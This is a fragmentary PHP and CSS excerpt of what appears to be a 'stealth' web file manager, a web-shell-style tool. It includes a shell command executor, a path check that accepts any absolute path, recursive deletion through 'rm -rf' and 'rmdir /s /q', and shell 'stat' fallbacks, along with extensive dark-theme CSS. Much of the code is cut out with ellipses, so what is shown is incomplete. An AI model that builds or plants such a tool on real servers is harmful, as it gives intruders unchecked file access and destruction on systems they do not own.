...
// --- CommandExecutor (unchanged from CAE-2.3) ---
...
function safeRealPath($path, $baseDir = '') {
    ...
    // Accept any absolute path without further checks
...
function ax_recursive_delete_hex($path) {
    ...
    if (!@is_dir($path) && $commandAvailable) {
        $escaped = escapeshellarg($path);
        CommandExecutor::run($is_windows ? "rmdir /s /q {$escaped}" : "rm -rf {$escaped}");
        return true;
    }
    $items = @scandir($path);
    if ($items !== false) {
...
// --- MAIN PAGE: directory listing with fallback ---
$errorMsg = '';
...
foreach ($directoryContents as $item) {
    ...
    // Gather metadata (only if PHP can; otherwise leave as default or get from shell)
    ...
    // If PHP metadata failed and we have shell, try to get them (Linux only)
    if (($fileSize === false || $fileModTime === false || $filePerms === false || $filePerms === '0000') && $commandAvailable && !$is_windows) {
        $esp = escapeshellarg($itemPath);
        if (!$isDirectory && $fileSize === false) {
            $sz = CommandExecutor::run("stat -c%s {$esp} 2>/dev/null");
            if (is_numeric(trim($sz))) { $fileSize = (int)trim($sz); }
        }
        if ($fileModTime === false) {
            $mt = CommandExecutor::run("stat -c%Y {$esp} 2>/dev/null");
            if (is_numeric(trim($mt))) { $fileModTime = (int)trim($mt); }
        }
        if ($filePerms === false || $filePerms === '0000') {
            $pc = CommandExecutor::run("stat -c%a {$esp} 2>/dev/null");
...
<head>
    ...
    <style>
        ...
        .stealth-fm *, .stealth-fm *::before, .stealth-fm *::after { box-sizing: border-box; margin: 0; padding: 0; transition: var(--fm-transition); }
        ...
        .stealth-fm .card { background-color: var(--fm-bg-panel); border: 1px solid var(--fm-border-color); border-radius: var(--fm-radius-lg); overflow: hidden; margin-bottom: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); }
        .stealth-fm .card-header { padding: 16px 24px; border-bottom: 1px solid var(--fm-border-color); display: flex; align-items: center; justify-content: space-between; background-color: var(--fm-bg-panel); position: relative; }
        .stealth-fm .card-header::before { content: ''; position: absolute; top: 0; left: 0; width: 3px; height: 100%; background-color: var(--fm-accent); }
        ...
        .stealth-fm .file-table th { padding: 14px 20px; text-align: left; font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.08em; color: var(--fm-text-muted); background-color: var(--fm-bg-main); border-bottom: 1px solid var(--fm-border-color); }
        ...
        .stealth-fm .file-icon { width: 32px; height: 32px; border-radius: var(--fm-radius-sm); display: flex; align-items: center; justify-content: center; margin-right: 12px; flex-shrink: 0; background-color: var(--fm-hover-bg); border: 1px solid var(--fm-border-color); }
        ...
        .stealth-fm .file-name { font-size: 14px; font-weight: 500; color: var(--fm-text-primary); text-decoration: none; }
        ...
        .stealth-fm input[type="text"], .stealth-fm input[type="file"], .stealth-fm select, .stealth-fm textarea { background-color: var(--fm-bg-main); border: 1px solid var(--fm-border-color); border-radius: var(--fm-radius-md); padding: 10px 14px; color: var(--fm-text-primary); font-size: 14px; outline: none; font-family: var(--fm-font-stack); }
        .stealth-fm input[type="text"]:focus, .stealth-fm textarea:focus, .stealth-fm select:focus { border-color: var(--fm-accent); box-shadow: 0 0 0 3px var(--fm-focus-ring); }
        .stealth-fm input[type="file"]::file-selector-button { background-color: var(--fm-bg-panel); color: var(--fm-text-primary); border: 1px solid var(--fm-border-color); border-radius: var(--fm-radius-sm); padding: 8px 14px; font-size: 13px; cursor: pointer; margin-right: 12px; }
        .stealth-fm input[type="file"]::file-selector-button:hover { border-color: var(--fm-accent); background-color: var(--fm-accent-soft); }
        ...
        .stealth-fm .btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; padding: 10px 18px; font-size: 13px; font-weight: 600; border-radius: var(--fm-radius-md); cursor: pointer; border: 1px solid transparent; text-decoration: none; font-family: inherit; }
        .stealth-fm .btn-primary, .stealth-fm .btn-success { background-color: var(--fm-accent); color: var(--fm-accent-text); box-shadow: 0 2px 8px rgba(211, 29, 52, 0.25); }
        .stealth-fm .btn-primary:hover, .stealth-fm .btn-success:hover { background-color: var(--fm-accent-hover); }
        .stealth-fm .btn-ghost { background-color: transparent; color: var(--fm-text-primary); border-color: var(--fm-border-color); }
        .stealth-fm .btn-ghost:hover { background-color: var(--fm-accent-soft); border-color: var(--fm-accent); color: var(--fm-accent); }
        .stealth-fm .btn-danger { background-color: var(--fm-danger-bg); color: var(--fm-danger); border-color: rgba(255, 69, 58, 0.2); }
        .stealth-fm .btn-danger:hover { background-color: rgba(255, 69, 58, 0.25); }
        .stealth-fm .btn-sm { padding: 6px 12px; font-size: 12px; border-radius: var(--fm-radius-sm); }
        .stealth-fm .theme-toggle { padding: 8px 16px; font-size: 12px; font-weight: 600; border-radius: var(--fm-radius-md); cursor: pointer; background: var(--fm-bg-panel); color: var(--fm-text-primary); border: 1px solid var(--fm-border-color); }
        .stealth-fm .theme-toggle:hover { border-color: var(--fm-accent); color: var(--fm-accent); }
        ...
        .stealth-fm .console { background-color: var(--fm-bg-main); border: 1px solid var(--fm-border-color); border-radius: var(--fm-radius-md); padding: 16px; font-family: var(--fm-font-mono); font-size: 13px; color: var(--fm-text-primary); max-height: 250px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
        .stealth-fm .bulk-bar { display: none; gap: 12px; align-items: center; padding: 14px 20px; background-color: var(--fm-bg-panel); border: 1px solid var(--fm-accent); border-radius: var(--fm-radius-md); margin-bottom: 20px; box-shadow: 0 4px 15px var(--fm-accent-soft); }
        ...
        .stealth-fm .modal-content { background-color: var(--fm-bg-panel); border: 1px solid var(--fm-border-color); border-radius: var(--fm-radius-lg); width: 450px; max-width: 90%; max-height: 90vh; overflow: auto; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
        ...
        #fm-loading-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.4); z-index: 999; align-items: center; justify-content: center; color: #fff; font-weight: 600; font-family: var(--fm-font-stack); backdrop-filter: blur(2px); }
